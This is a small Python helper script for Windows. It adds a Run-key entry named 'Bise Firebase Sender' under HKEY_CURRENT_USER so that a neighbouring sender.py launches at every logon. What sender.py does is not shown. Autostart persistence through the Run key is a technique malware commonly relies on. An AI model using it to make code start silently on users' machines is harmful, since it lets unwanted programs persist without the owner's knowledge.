import winreg as reg
import os            
 
def AddToRegistry():
 
    # Absolute path to this file
    abs_path = os.path.dirname(os.path.realpath(__file__))
    # Split of the helper folder
    path, tail = os.path.split(abs_path)
    # Name of the python file
    file = "sender.py"    
    # joins the file name to end of path address
    address=os.path.join(path, file)
     
    # Windows register we want to change
    # Can be traced back by looking in the Registry Editor
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Open the key to make changes to
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
     
    # Modify the opened key
    reg.SetValueEx(open,"Bise Firebase Sender",0,reg.REG_SZ,address)
     
    # Close the opened key
    reg.CloseKey(open)

if __name__=="__main__":
    AddToRegistry()